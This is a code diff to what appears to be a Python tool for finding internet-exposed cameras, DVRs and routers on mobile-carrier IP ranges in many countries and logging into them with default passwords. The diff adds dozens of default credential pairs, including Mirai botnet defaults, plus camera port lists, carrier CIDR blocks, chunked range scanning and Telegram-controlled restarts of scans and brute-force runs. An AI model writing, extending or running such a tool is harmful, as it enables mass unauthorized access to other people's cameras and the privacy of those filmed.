@@ -868,6 +868,47 @@ _4G_MODEM_CREDS: list = [
     ("root",     "admin"),
     ("root",     "12345"),
     ("root",     "pass"),
+    # TP-Link / generic wireless routers with cam
+    ("admin",    "tplink1234"),
+    ("admin",    "tp@admin"),
+    ("admin",    "Tp@1234"),
+    # Huawei extended
+    ("admin",    "admin@huawei"),
+    ("admin",    "12345678"),
+    ("admin",    "Huawei1234"),
+    # Generic user/guest/service accounts
+    ("user",     "user"),
+    ("user",     "12345"),
+    ("guest",    "guest"),
+    ("guest",    ""),
+    ("service",  "service"),
+    ("operator", "operator"),
+    # More numeric variants
+    ("admin",    "000000"),
+    ("admin",    "9999"),
+    ("admin",    "admin1234"),
+    ("admin",    "abcd1234"),
+    ("admin",    "1qaz2wsx"),
+    ("admin",    "p@ssw0rd"),
+    ("admin",    "pass123"),
+    # Yi / Xiaomi cameras
+    ("admin",    "yi1234"),
+    ("admin",    "xiaomi"),
+    ("admin",    "mi12345"),
+    # Reolink / Annke
+    ("admin",    "reolink"),
+    ("admin",    "annke"),
+    # Mirai botnet defaults (common on compromised cams — good indicator)
+    ("root",     "xc3511"),
+    ("root",     "vizxv"),
+    ("root",     "7ujMko0admin"),
+    ("root",     "7ujMko0vizxv"),
+    ("admin",    "7ujMko0admin"),
+    # DVR/NVR legacy defaults
+    ("admin",    "admin@123"),
+    ("666666",   "666666"),
+    ("999999",   "999999"),
+    ("123456",   "123456"),
 ]
 
 def _merge_4g_creds(base_creds: list) -> list:
@@ -885,6 +926,30 @@ _lockout_cd_lock = threading.Lock()
 # ── Quick-scan mode (--quick: only 4 most common ports) ───────────────────────
 _quick_scan_mode: bool = False
 _QUICK_PORTS = [80, 554, 8080, 37777]
+
+# ── Ports specific to 4G/5G modem-attached cameras ─────────────────────────────
+# Extends the default scan list with ports commonly found on mobile-carrier IPs:
+# cheap Chinese/XiongMai cameras, DVR/NVR boxes, Huawei/ZTE routers with cam,
+# ONVIF-capable devices, and P2P cloud cameras.
+_4G_PORTS: list = [
+    80, 81, 82, 83,           # HTTP and alternates
+    443, 8443,                 # HTTPS
+    8000, 8080, 8081, 8082, 8083, 8084, 8085, 8090, 8091,  # HTTP alt
+    8200, 8888, 9000, 9001,    # Common cam HTTP variants
+    37777, 37778, 37779,       # Dahua SDK
+    34567, 4567,               # Generic DVR
+    4000, 4321,                # DVR/NVR mgmt
+    2000, 2001,                # DVR serial / mgmt
+    7080,                      # ONVIF
+    8899,                      # XiongMai / budget IP cams
+    9999,                      # Foscam / generic
+    18080, 18081,              # Hikvision / DVR variants
+    6789,                      # Huawei / ZTE
+    50000, 50001,              # P2P cloud cameras
+    1024, 1025, 1050, 3000,    # Misc cam ports
+    554, 8554, 10554,          # RTSP (port-open detection only)
+    52869,                     # UPNP (common on modem-attached cams)
+]
 
 # ── Counter-only lock (scanned_count increments — separate from results_lock) ──
 _counter_lock = threading.Lock()
@@ -2606,7 +2671,8 @@ def _inject_preferred_admin(ip: str, port: int, username: str, password: str,
 
 # ── 4G/5G Modem Camera Finder ─────────────────────────────────────────────────
 _MOBILE_CARRIER_CIDRS: dict = {
-    'BD': ['117.18.0.0/16','103.15.250.0/24','45.125.56.0/22','202.134.8.0/21'],
+    'BD': ['117.18.0.0/16','103.15.250.0/24','45.125.56.0/22','202.134.8.0/21',
+           '111.119.0.0/16','58.97.128.0/17','103.102.92.0/22'],  # merged duplicates
     'IN': ['49.32.0.0/11','49.36.0.0/14','103.17.68.0/22','117.200.0.0/13'],
     'PK': ['111.68.96.0/19','103.7.56.0/22','202.163.96.0/19','36.255.0.0/16'],
     'ID': ['114.122.0.0/15','180.240.0.0/14','103.28.12.0/22','116.206.0.0/15'],
@@ -2625,8 +2691,42 @@ _MOBILE_CARRIER_CIDRS: dict = {
     'UA': ['91.197.68.0/22','37.57.0.0/16','46.150.0.0/16','176.38.0.0/16'],
     'RU': ['46.0.0.0/11','92.101.0.0/17','176.214.0.0/15','37.144.0.0/13'],
     'TR': ['78.161.0.0/17','77.79.0.0/16','85.104.0.0/14','94.55.0.0/16'],
-    'BD': ['111.119.0.0/16','58.97.128.0/17','103.102.92.0/22'],
 }
+
+def _cidr_to_chunks(cidr_str: str, chunk_size: int = 65536) -> list:
+    """
+    Split a CIDR block into scan-sized (chunk_size) IP ranges.
+    Returns list of (start_ip, end_ip, chunk_num, total_chunks) tuples.
+    Uses integer arithmetic — never expands the full host list into memory.
+    This avoids the 65537-cap problem in ip_range_to_list for large CIDRs.
+    """
+    try:
+        import ipaddress as _ipm2
+        _net = _ipm2.IPv4Network(cidr_str, strict=False)
+        _first = int(_net.network_address) + 1   # skip network address
+        _last  = int(_net.broadcast_address) - 1  # skip broadcast
+        if _first > _last:
+            return []
+        _total = _last - _first + 1
+        _total_chunks = (_total + chunk_size - 1) // chunk_size
+        _chunks = []
+        _cur = _first
+        _cn  = 1
+        while _cur <= _last:
+            _end = min(_cur + chunk_size - 1, _last)
+            _chunks.append((
+                str(_ipm2.IPv4Address(_cur)),
+                str(_ipm2.IPv4Address(_end)),
+                _cn,
+                _total_chunks
+            ))
+            _cur = _end + 1
+            _cn += 1
+        return _chunks
+    except Exception as _ce:
+        print(f"{Fore.RED}[!] _cidr_to_chunks error for {cidr_str}: {_ce}{Style.RESET_ALL}")
+        return []
+
 
 def list_mobile_camera_targets(country_code: str = '') -> list:
     """
@@ -4244,41 +4344,83 @@ def _telegram_cmd_worker(bot_token: str) -> None:
                             _done  = _sp.get('scanned_count', 0)
                             _total = _sp.get('total_ips', 0)
                             _pct   = int(_done * 100 / _total) if _total else 0
-                            _resume_country = next(
-                                (c for c in COUNTRIES.values()
-                                 if c.get('code') == _rc), None
-                            )
-                            if _resume_country:
-                                def _run_scan(_c=_resume_country):
-                                    try:
-                                        scan_country_cameras_detection_only(_c)
-                                    except Exception as _e:
-                                        _log_tg_err(f"[/restart] IP scan error: {_e}")
-                                threading.Thread(
-                                    target=_run_scan, daemon=True,
-                                    name="RestartedIPScan"
-                                ).start()
-                                _also = ""
-                                if _bp:
-                                    _bf = os.path.basename(_bp.get('input_file', '?'))
-                                    _also = (f"\n📌 Login-check progress for <code>{_bf}</code> "
-                                             f"is also saved — send /restart again after this scan.")
-                                _telegram_cmd_reply(
-                                    reply_token, from_chat,
-                                    f"🔄 <b>IP Scan Restarted</b>\n"
-                                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                                    f"🌍 Country: <b>{_rn} ({_rc})</b>\n"
-                                    f"📍 Resuming: {_done:,}/{_total:,} IPs ({_pct}%)\n"
-                                    f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-                                    + _also
-                                )
+                            # ── IP-range scans store "start-end" as country_code ──
+                            _rc_is_ip_range_tg = ('.' in _rc and '-' in _rc)
+                            if _rc_is_ip_range_tg:
+                                # Resume as a direct IP-range scan
+                                try:
+                                    _ip_dash_tg = _rc.rfind('-')
+                                    _rip_start_tg = _rc[:_ip_dash_tg]
+                                    _rip_end_tg   = _rc[_ip_dash_tg+1:]
+                                    def _run_ip_range_scan(_s=_rip_start_tg, _e=_rip_end_tg):
+                                        try:
+                                            clear_scan_progress()
+                                            _cr = _merge_4g_creds(load_credentials())
+                                            scan_ip_range(_s, _e, _cr)
+                                        except Exception as _err:
+                                            _log_tg_err(f"[/restart] IP range scan error: {_err}")
+                                    threading.Thread(
+                                        target=_run_ip_range_scan, daemon=True,
+                                        name="RestartedIPRangeScan"
+                                    ).start()
+                                    _also = ""
+                                    if _bp:
+                                        _bf = os.path.basename(_bp.get('input_file', '?'))
+                                        _also = (f"\n📌 Login-check for <code>{_bf}</code> "
+                                                 f"also saved — send /restart again after this scan.")
+                                    _telegram_cmd_reply(
+                                        reply_token, from_chat,
+                                        f"🔄 <b>IP Range Scan Restarted</b>\n"
+                                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                                        f"📡 Range: <code>{_rip_start_tg} – {_rip_end_tg}</code>\n"
+                                        f"📍 Was at: {_done:,}/{_total:,} IPs ({_pct}%)\n"
+                                        f"🔁 Restarting from beginning (already-found cams skipped)\n"
+                                        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                                        + _also
+                                    )
+                                except Exception as _tg_rip_err:
+                                    _telegram_cmd_reply(
+                                        reply_token, from_chat,
+                                        f"❌ Could not parse range <b>{_rc}</b>: {_tg_rip_err}\n"
+                                        f"Clearing stale progress."
+                                    )
+                                    clear_scan_progress()
                             else:
-                                _telegram_cmd_reply(
-                                    reply_token, from_chat,
-                                    f"❌ Country code <b>{_rc}</b> not found in database.\n"
-                                    f"Clearing stale progress — start a fresh scan from the terminal."
+                                _resume_country = next(
+                                    (c for c in COUNTRIES.values()
+                                     if c.get('code') == _rc), None
                                 )
-                                clear_scan_progress()
+                                if _resume_country:
+                                    def _run_scan(_c=_resume_country):
+                                        try:
+                                            scan_country_cameras_detection_only(_c)
+                                        except Exception as _e:
+                                            _log_tg_err(f"[/restart] IP scan error: {_e}")
+                                    threading.Thread(
+                                        target=_run_scan, daemon=True,
+                                        name="RestartedIPScan"
+                                    ).start()
+                                    _also = ""
+                                    if _bp:
+                                        _bf = os.path.basename(_bp.get('input_file', '?'))
+                                        _also = (f"\n📌 Login-check progress for <code>{_bf}</code> "
+                                                 f"is also saved — send /restart again after this scan.")
+                                    _telegram_cmd_reply(
+                                        reply_token, from_chat,
+                                        f"🔄 <b>IP Scan Restarted</b>\n"
+                                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                                        f"🌍 Country: <b>{_rn} ({_rc})</b>\n"
+                                        f"📍 Resuming: {_done:,}/{_total:,} IPs ({_pct}%)\n"
+                                        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                                        + _also
+                                    )
+                                else:
+                                    _telegram_cmd_reply(
+                                        reply_token, from_chat,
+                                        f"❌ Country code <b>{_rc}</b> not found in database.\n"
+                                        f"Clearing stale progress — start a fresh scan from the terminal."
+                                    )
+                                    clear_scan_progress()
 
                         else:  # brute-force restart
                             _bf_path  = _bp.get('input_file', '')
@@ -5334,7 +5476,7 @@ def ip_range_to_list(start_ip: str, end_ip: str) -> List[str]:
         while current <= end:
             ip_list.append(str(current))
             current += 1
-            if len(ip_list) > 65536:  # Safety limit
+            if len(ip_list) >= 65536:  # Safety limit — cap at exactly 65536, not 65537
                 break
 
         return ip_list
@@ -17088,22 +17230,35 @@ def tools_submenu() -> None:
                         cctv_output_file = _4g_out_file
                         print(f"{C}[4G/5G] Results → {os.path.basename(_4g_out_file)}{W}")
 
+                        # ── Temporarily use 4G-specific port list ─────────────────
+                        _prev_ports23 = list(_cli_port_override)
+                        _cli_port_override.clear()
+                        _cli_port_override.extend(_4G_PORTS)
+
                         if _act23 == 'a':
-                            # ── Scan ALL ranges one by one ─────────────────────────────
+                            # ── Scan ALL ranges one by one, chunked ────────────────────
                             _creds23 = _merge_4g_creds(load_credentials())
                             for _ridx23, (_tcc23, _cidr23) in enumerate(_ranges23, 1):
                                 if _stop_requested.is_set():
                                     break
                                 try:
-                                    _net23 = _ip23mod.IPv4Network(_cidr23, strict=False)
-                                    _hs23  = list(_net23.hosts())
-                                    if not _hs23:
+                                    _net23     = _ip23mod.IPv4Network(_cidr23, strict=False)
+                                    _nhosts23  = _net23.num_addresses - 2
+                                    _chunks23  = _cidr_to_chunks(_cidr23)
+                                    if not _chunks23:
                                         continue
-                                    _s23 = str(_hs23[0])
-                                    _e23 = str(_hs23[-1])
+                                    _ctot23 = _chunks23[0][3]
                                     print(f"\n{C}[4G/5G Scan {_ridx23}/{len(_ranges23)}] "
-                                          f"{_tcc23} {_cidr23} → {_s23} – {_e23}{W}")
-                                    scan_ip_range(_s23, _e23, _creds23)
+                                          f"{_tcc23} {_cidr23} — {_nhosts23:,} IPs"
+                                          + (f" ({_ctot23} blocks)" if _ctot23 > 1 else "")
+                                          + f"{W}")
+                                    for _cs23, _ce23, _cnum23, _ in _chunks23:
+                                        if _stop_requested.is_set():
+                                            break
+                                        if _ctot23 > 1:
+                                            print(f"{C}  ↳ Block {_cnum23}/{_ctot23}: "
+                                                  f"{_cs23} – {_ce23}{W}")
+                                        scan_ip_range(_cs23, _ce23, _creds23)
                                 except Exception as _e23err:
                                     print(f"{R}[!] Skipped {_cidr23}: {_e23err}{W}")
                             print(f"\n{G}[✓] All {len(_ranges23)} 4G/5G ranges scanned.{W}")
@@ -17130,20 +17285,38 @@ def tools_submenu() -> None:
                                         print(f"{R}[!] Range {_si23+1} out of bounds, skipped.{W}")
                                         continue
                                     _tcc23s, _sel23 = _ranges23[_si23]
-                                    _net23 = _ip23mod.IPv4Network(_sel23, strict=False)
-                                    _hs23  = list(_net23.hosts())
-                                    if _hs23:
-                                        _s23 = str(_hs23[0])
-                                        _e23 = str(_hs23[-1])
-                                        print(f"{C}[4G/5G Scan {_si23+1}] {_tcc23s} {_sel23} → {_s23} – {_e23}{W}")
-                                        scan_ip_range(_s23, _e23, _creds23s)
+                                    _net23s    = _ip23mod.IPv4Network(_sel23, strict=False)
+                                    _nhosts23s = _net23s.num_addresses - 2
+                                    _chunks23s = _cidr_to_chunks(_sel23)
+                                    if _chunks23s:
+                                        _ctot23s = _chunks23s[0][3]
+                                        print(f"{C}[4G/5G Scan {_si23+1}] {_tcc23s} {_sel23} "
+                                              f"— {_nhosts23s:,} IPs"
+                                              + (f" ({_ctot23s} blocks)" if _ctot23s > 1 else "")
+                                              + f"{W}")
+                                        for _cs23s, _ce23s, _cnum23s, _ in _chunks23s:
+                                            if _stop_requested.is_set():
+                                                break
+                                            if _ctot23s > 1:
+                                                print(f"{C}  ↳ Block {_cnum23s}/{_ctot23s}: "
+                                                      f"{_cs23s} – {_ce23s}{W}")
+                                            scan_ip_range(_cs23s, _ce23s, _creds23s)
                                 print(f"{G}[✓] Results saved → {_4g_out_file}{W}")
                             except (IndexError, ValueError) as _e23err:
                                 print(f"{R}[!] Error: {_e23err}{W}")
 
-                        cctv_output_file = _prev_output  # restore previous output file
+                        # ── Restore ports and output file ─────────────────────
+                        _cli_port_override.clear()
+                        _cli_port_override.extend(_prev_ports23)
+                        cctv_output_file = _prev_output
                     except (EOFError, KeyboardInterrupt):
-                        pass
+                        # Make sure ports/output are always restored on abort
+                        try:
+                            _cli_port_override.clear()
+                            _cli_port_override.extend(_prev_ports23)
+                            cctv_output_file = _prev_output
+                        except Exception:
+                            pass
             except (EOFError, KeyboardInterrupt):
                 pass
             if _tools_wait_back():
@@ -27978,16 +28151,49 @@ if (CAMERAS.length > 0) {{
 
             if _do_scan and _startup_scan_prog:
                 _rc = _startup_scan_prog.get('country_code', '')
-                _resume_country = next(
-                    (c for c in COUNTRIES.values() if c.get('code') == _rc), None
-                )
-                if _resume_country:
-                    print(f"\n{Fore.GREEN}[✓] Resuming IP scan for "
-                          f"{_resume_country['name']} ({_rc})...{Style.RESET_ALL}\n")
-                    scan_country_cameras_detection_only(_resume_country)
+                # ── Detect IP-range format (e.g. "202.69.128.1-202.69.191.254") ──
+                # scan_ip_range() stores "start-end" as country_code; it is NOT a
+                # real country code so COUNTRIES.values() will never match it.
+                _rc_is_ip_range = ('.' in _rc and '-' in _rc)
+                if _rc_is_ip_range:
+                    # Parse "start_ip-end_ip" back out
+                    try:
+                        _rip_parts = _rc.rsplit('-', 1)
+                        # Handle IPv4 addresses which contain dots but not dashes
+                        # Format is always "A.B.C.D-W.X.Y.Z"
+                        _ip_dash = _rc.rfind('-')
+                        _rip_start = _rc[:_ip_dash]
+                        _rip_end   = _rc[_ip_dash+1:]
+                        _rip_done  = _startup_scan_prog.get('scanned_count', 0)
+                        _rip_total = _startup_scan_prog.get('total_ips', 0)
+                        _rip_last  = _startup_scan_prog.get('last_ip_in_range', '')
+                        _rip_pct   = int(_rip_done * 100 / _rip_total) if _rip_total else 0
+                        print(f"\n{Fore.CYAN}[✓] Resuming IP range scan:{Style.RESET_ALL}")
+                        print(f"    Range : {_rip_start} – {_rip_end}")
+                        print(f"    Done  : {_rip_done:,}/{_rip_total:,} IPs ({_rip_pct}%)")
+                        if _rip_last:
+                            print(f"    Last  : {_rip_last}")
+                        print(f"\n{Fore.YELLOW}  Note: IP-range scans restart from the beginning")
+                        print(f"  (already-found cameras in the output file are skipped).{Style.RESET_ALL}\n")
+                        clear_scan_progress()
+                        _rip_creds = _merge_4g_creds(load_credentials())
+                        # Use chunked scanning for large CIDRs via start-end range
+                        scan_ip_range(_rip_start, _rip_end, _rip_creds)
+                    except Exception as _rip_err:
+                        print(f"{Fore.YELLOW}[!] Could not parse IP range '{_rc}': {_rip_err}. "
+                              f"Clearing saved progress.{Style.RESET_ALL}")
+                        clear_scan_progress()
                 else:
-                    print(f"{Fore.YELLOW}[!] Country '{_rc}' not found. Clearing saved progress.{Style.RESET_ALL}")
-                    clear_scan_progress()
+                    _resume_country = next(
+                        (c for c in COUNTRIES.values() if c.get('code') == _rc), None
+                    )
+                    if _resume_country:
+                        print(f"\n{Fore.GREEN}[✓] Resuming IP scan for "
+                              f"{_resume_country['name']} ({_rc})...{Style.RESET_ALL}\n")
+                        scan_country_cameras_detection_only(_resume_country)
+                    else:
+                        print(f"{Fore.YELLOW}[!] Country '{_rc}' not found. Clearing saved progress.{Style.RESET_ALL}")
+                        clear_scan_progress()
 
             elif _do_brute and _startup_brute_prog:
                 _bf_path = _startup_brute_prog.get('input_file', '')
